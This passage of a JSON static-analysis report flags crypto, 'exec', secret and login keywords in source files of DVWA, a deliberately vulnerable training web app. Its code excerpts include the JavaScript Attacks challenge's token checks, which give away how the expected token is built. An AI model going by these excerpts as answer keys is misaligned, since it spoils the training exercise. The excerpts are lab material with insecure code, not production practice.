        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: JavaScript Attacks&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;javascript&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;javascript&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 26,
        "endLocationLine": 57,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 41,
        "endLocationLine": 57,
        "endLocationColumn": 45
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\tif ($phrase == &quot;success&quot;) {\n\t\t\tswitch( $_COOKIE[ &#39;security&#39; ] ) {\n\t\t\t\tcase &#39;low&#39;:\n\t\t\t\t\tif ($token == md5(str_rot13(&quot;success&quot;))) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 43,
        "startLocationColumn": 20,
        "endLocationLine": 43,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 20,
        "endLocationLine": 57,
        "endLocationColumn": 24
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 35,
        "endLocationLine": 57,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/external/recaptcha/recaptchalib.php",
        "ruleId": "AI016000",
        "ruleName": "Data: Secret",
        "ruleDescription": "Data: Secret",
        "pattern": "\\b(secret)\\b",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Secret"
        ],
        "sample": "secret",
        "excerpt": "\ttry {\n\t\t$url = &#39;https://www.google.com/recaptcha/api/siteverify&#39;;\n\t\t$dat = array(\n\t\t\t&#39;secret&#39;   =&gt; $key,\n\t\t\t&#39;response&#39; =&gt; urlencode($response),\n\t\t\t&#39;remoteip&#39; =&gt; urlencode($_SERVER[&#39;REMOTE_ADDR&#39;])\n\t\t);\n\n\t\t$opt = array(\n",
        "startLocationLine": 14,
        "startLocationColumn": 5,
        "endLocationLine": 14,
        "endLocationColumn": 11
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ] = array();\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;brute&#39;, &#39;name&#39; =&gt; &#39;Brute Force&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/brute/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;exec&#39;, &#39;name&#39; =&gt; &#39;Command Injection&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/exec/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;csrf&#39;, &#39;name&#39; =&gt; &#39;CSRF&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/csrf/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;fi&#39;, &#39;name&#39; =&gt; &#39;File Inclusion&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/fi/.?page=include.php&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;upload&#39;, &#39;name&#39; =&gt; &#39;File Upload&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/upload/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;captcha&#39;, &#39;name&#39; =&gt; &#39;Insecure CAPTCHA&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/captcha/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;sqli&#39;, &#39;name&#39; =&gt; &#39;SQL Injection&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/sqli/&#39; );\n",
        "startLocationLine": 200,
        "startLocationColumn": 56,
        "endLocationLine": 200,
        "endLocationColumn": 60
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ] = array();\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;brute&#39;, &#39;name&#39; =&gt; &#39;Brute Force&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/brute/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;exec&#39;, &#39;name&#39; =&gt; &#39;Command Injection&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/exec/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;csrf&#39;, &#39;name&#39; =&gt; &#39;CSRF&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/csrf/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;fi&#39;, &#39;name&#39; =&gt; &#39;File Inclusion&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/fi/.?page=include.php&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;upload&#39;, &#39;name&#39; =&gt; &#39;File Upload&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/upload/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;captcha&#39;, &#39;name&#39; =&gt; &#39;Insecure CAPTCHA&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/captcha/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;sqli&#39;, &#39;name&#39; =&gt; &#39;SQL Injection&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/sqli/&#39; );\n",
        "startLocationLine": 200,
        "startLocationColumn": 120,
        "endLocationLine": 200,
        "endLocationColumn": 124
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "\n\nfunction dvwaPageStartup( $pActions ) {\n\tif( in_array( &#39;authenticated&#39;, $pActions ) ) {\n\t\tif( !dvwaIsLoggedIn()) {\n\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;login.php&#39; );\n\t\t}\n\t}\n\n",
        "startLocationLine": 62,
        "startLocationColumn": 17,
        "endLocationLine": 62,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "function dvwaPageStartup( $pActions ) {\n\tif( in_array( &#39;authenticated&#39;, $pActions ) ) {\n\t\tif( !dvwaIsLoggedIn()) {\n\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;login.php&#39; );\n\t\t}\n\t}\n\n\tif( in_array( &#39;phpids&#39;, $pActions ) ) {\n\t\tif( dvwaPhpIdsIsEnabled() ) {\n",
        "startLocationLine": 64,
        "startLocationColumn": 43,
        "endLocationLine": 64,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\t$menuBlocks[ &#39;meta&#39; ][] = array( &#39;id&#39; =&gt; &#39;about&#39;, &#39;name&#39; =&gt; &#39;About&#39;, &#39;url&#39; =&gt; &#39;about.php&#39; );\n\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n",
        "startLocationLine": 223,
        "startLocationColumn": 17,
        "endLocationLine": 223,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 17,
        "endLocationLine": 224,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 47,
        "endLocationLine": 224,
        "endLocationColumn": 53
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 67,
        "endLocationLine": 224,
        "endLocationColumn": 73
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 86,
        "endLocationLine": 224,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n$DVWAPHPWrite     = &#39;[User: &#39; . get_current_user() . &#39;] Writable file &#39; . $PHPIDSPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPIDSPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                              // PHPIDS\n\n",
        "startLocationLine": 565,
        "startLocationColumn": 84,
        "endLocationLine": 565,
        "endLocationColumn": 94
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n$DVWAPHPWrite     = &#39;[User: &#39; . get_current_user() . &#39;] Writable file &#39; . $PHPIDSPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPIDSPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                              // PHPIDS\n\n",
        "startLocationLine": 565,
        "startLocationColumn": 122,
        "endLocationLine": 565,
        "endLocationColumn": 132
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n$DVWAPHPWrite     = &#39;[User: &#39; . get_current_user() . &#39;] Writable file &#39; . $PHPIDSPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPIDSPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                              // PHPIDS\n\n",
        "startLocationLine": 565,
        "startLocationColumn": 179,
        "endLocationLine": 565,
        "endLocationColumn": 189
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
